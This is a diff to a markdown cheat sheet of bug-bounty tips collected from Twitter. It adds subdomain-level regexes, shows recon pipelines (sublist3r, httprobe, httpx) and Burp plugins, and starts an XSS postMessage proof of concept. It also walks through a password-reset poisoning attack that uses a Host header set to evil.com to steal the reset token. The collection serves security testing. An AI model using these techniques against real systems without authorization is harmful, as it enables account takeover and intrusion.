@@ -1,4 +1,4 @@
-### BugBounty Tips	
+# BugBounty Tips	
 Collection of `#bugbountytips` from twitter.
 # Recon
 ```
@@ -23,6 +23,16 @@ for domain in $(cat $1.txt); do sublist3r -d $domain -o thirdlevel/$domain.txt; 
 echo "Probing for alive third-levels..."
 cat final.txt | httprobe > probed.txt
 ```
+
+# subdomain level extraction
+|Regex pattern	|Domain level match|
+| ------ | ------ |
+|grep -P '^(?:[a-z0-9]+\.){1}[^.]*$'	|2nd level domains only|
+|grep -P '^(?:[a-z0-9]+\.){2}[^.]*$'	|3rd level domains only|
+|grep -P '^(?:[a-z0-9]+\.){2,}[^.]*$'	|3rd level domains or higher|
+|grep -P '^(?:[a-z0-9]+\.){2,3}[^.]*$'	|3rd to 4th level domains only|
+|grep -P '^(?:[a-z0-9]+\.){3,}[^.]*$'	|4th level domains or higher|
+
 # Check live 
 ```
 cat GREPABLENMAP.gnmap | grep 443/open | cut -d "(" -f 1 | cut -d : -f 2| tr -d " " | sed -E 's#https?://##I' | sed -E 's#/.*##' | sed -E 's#^\*\.?##' | sed -E 's#,#\n#g' | tr '[:upper:]' '[:lower:]' | uniq | sed -e 's/^/https:\/\//' | httpx -silent -timeout 2 -threads 100 -status-code -mc 200,302 |anew 
@@ -345,6 +355,7 @@ echo "bugcrowd.com" | subfinder -silent | hakrawler -plain -usewayback -scope yo
 
 
 
+
 ### Cool BurpPlugins
 ```
 Autorize – To test BACs (Broken Access Control)
@@ -377,8 +388,34 @@ Web Cache Deception Scanner
 cat urls.txt | python3 favfreak.py -o output
 ```
 
+### Password Poisoning
+```
+(1) Normal request:
 
-### Misc
+Request:
+POST /password-reset?user=123 HTTP/1.1
+Host: target.com
+Link received:
+https://target.com/reset-link=1g2f3guy23g
+(2) Basic HHI (Host Header Injection):
+
+Request:
+POST /password-reset?user=123 HTTP/1.1
+Host: evil.com
+Link received:
+none
+Error 404 - request blocked
+(3) Bypass technique:
+
+Request:
+POST https://target.com/password-reset?user=123 HTTP/1.1
+Host: evil.com
+Link received:
+https://evil.com/reset-link=1g2f3guy23g
+```
+
+
+### XSS Post Message POC
 ```
 Vulnerable PostMessage
 <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
